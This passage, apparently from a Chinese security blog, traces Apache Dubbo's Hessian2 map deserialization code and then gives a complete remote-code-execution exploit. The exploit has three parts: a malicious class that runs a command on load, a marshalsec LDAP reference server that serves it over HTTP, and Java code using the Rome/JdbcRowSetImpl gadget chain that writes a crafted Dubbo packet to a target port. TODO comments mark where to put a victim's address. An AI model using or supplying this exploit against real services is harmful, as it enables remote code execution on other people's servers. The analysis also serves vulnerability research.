由此，想要rce，估计得找到以下条件的gadget clain：
1. 有参构造方法
1. 参数不包含非基本类型
1. cost最小的构造方法并且全部都是基本类型或String
这样的利用条件太苛刻了，不过万事没绝对，参考marshalsec，可以利用rome依赖使用HashMap触发key的hashCode方法的gadget chain来打，以下是对hessian2反序列化map的源码跟踪：

```
@Override
@SuppressWarnings("unchecked")
public &lt;T&gt; T readObject(Class&lt;T&gt; cls) throws IOException,
        ClassNotFoundException `{`
    return (T) mH2i.readObject(cls);
`}`
```

-&gt;

```
@Override
public Object readObject(Class cl)
        throws IOException `{`
    return readObject(cl, null, null);
`}`
```

-&gt;

```
@Override
public Object readObject(Class expectedClass, Class&lt;?&gt;... expectedTypes) throws IOException `{`
    //...
    switch (tag) `{`
        //...
        case 'H': `{`
            Deserializer reader = findSerializerFactory().getDeserializer(expectedClass);

            boolean keyValuePair = expectedTypes != null &amp;&amp; expectedTypes.length == 2;
            // fix deserialize of short type
            return reader.readMap(this
                    , keyValuePair ? expectedTypes[0] : null
                    , keyValuePair ? expectedTypes[1] : null);
        `}`
        //...    
    `}`
`}`
```

-&gt;

```
@Override
public Object readMap(AbstractHessianInput in, Class&lt;?&gt; expectKeyType, Class&lt;?&gt; expectValueType) throws IOException `{`
    Map map;

    if (_type == null)
        map = new HashMap();
    else if (_type.equals(Map.class))
        map = new HashMap();
    else if (_type.equals(SortedMap.class))
        map = new TreeMap();
    else `{`
        try `{`
            map = (Map) _ctor.newInstance();
        `}` catch (Exception e) `{`
            throw new IOExceptionWrapper(e);
        `}`
    `}`

    in.addRef(map);

    doReadMap(in, map, expectKeyType, expectValueType);

    in.readEnd();

    return map;
`}`
```

-&gt;

```
protected void doReadMap(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType) throws IOException `{`
    Deserializer keyDeserializer = null, valueDeserializer = null;

    SerializerFactory factory = findSerializerFactory(in);
    if(keyType != null)`{`
        keyDeserializer = factory.getDeserializer(keyType.getName());
    `}`
    if(valueType != null)`{`
        valueDeserializer = factory.getDeserializer(valueType.getName());
    `}`

    while (!in.isEnd()) `{`
        map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(),
                valueDeserializer != null? valueDeserializer.readObject(in) : in.readObject());
    `}`
`}`
```

从上面贴出来的部分执行栈信息，可以清晰的看到，最终在反序列化中实例化了新的HashMap，然后把反序列化出来的实例put进去，因此，会触发key的hashCode方法。

创建gadget chain：
- 具有rome依赖的gadget chain
依赖

```
&lt;dependency&gt;
  &lt;groupId&gt;com.rometools&lt;/groupId&gt;
  &lt;artifactId&gt;rome&lt;/artifactId&gt;
  &lt;version&gt;1.7.0&lt;/version&gt;
&lt;/dependency&gt;
```

创建恶意class，放到http服务器（80端口）

```
public class ExecObject `{`
    static `{`
        try `{`
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        `}` catch (IOException e) `{`
            e.printStackTrace();
        `}`
    `}`
`}`
```

启动ldap服务

```
java -jar marshalsec.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:80/#ExecObject 44321
```

构造payload

```
JdbcRowSetImpl rs = new JdbcRowSetImpl();
//todo 此处填写ldap url
rs.setDataSourceName("ldap://127.0.0.1:43658/ExecObject");
rs.setMatchColumn("foo");
Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);

ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
EqualsBean root = new EqualsBean(ToStringBean.class, item);

HashMap s = new HashMap&lt;&gt;();
Reflections.setFieldValue(s, "size", 2);
Class&lt;?&gt; nodeC;
try `{`
  nodeC = Class.forName("java.util.HashMap$Node");
`}`
catch ( ClassNotFoundException e ) `{`
  nodeC = Class.forName("java.util.HashMap$Entry");
`}`
Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
nodeCons.setAccessible(true);

Object tbl = Array.newInstance(nodeC, 2);
Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
Reflections.setFieldValue(s, "table", tbl);

ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

// header.
byte[] header = new byte[16];
// set magic number.
Bytes.short2bytes((short) 0xdabb, header);
// set request and serialization flag.
header[2] = (byte) ((byte) 0x80 | 2);

// set request id.
Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

out.writeUTF("2.0.2");
//todo 此处填写注册中心获取到的service全限定名、版本号、方法名
out.writeUTF("com.threedr3am.learn.server.boot.DemoService");
out.writeUTF("1.0");
out.writeUTF("hello");
//todo 方法描述不需要修改，因为此处需要指定map的payload去触发
out.writeUTF("Ljava/util/Map;");
out.writeObject(s);
out.writeObject(new HashMap());

out.flushBuffer();
if (out instanceof Cleanable) `{`
  ((Cleanable) out).cleanup();
`}`

Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
byteArrayOutputStream.write(header);
byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

byte[] bytes = byteArrayOutputStream.toByteArray();

//todo 此处填写被攻击的dubbo服务提供者地址和端口
Socket socket = new Socket("127.0.0.1", 20880);
OutputStream outputStream = socket.getOutputStream();
outputStream.write(bytes);
outputStream.flush();
outputStream.close();
```

我这里把gadget chain的demo放在github上，感兴趣的可以clone下来试试：[https://github.com/threedr3am/learnjavabug](https://github.com/threedr3am/learnjavabug)

具体代码位于com.threedr3am.bug.dubbo.JdbcRowSetImplPoc
<li>其它gadget chain<br>
除了rome外，还有其它的gadget chains，例如bcel加载器等等，这里就不写出来了。</li>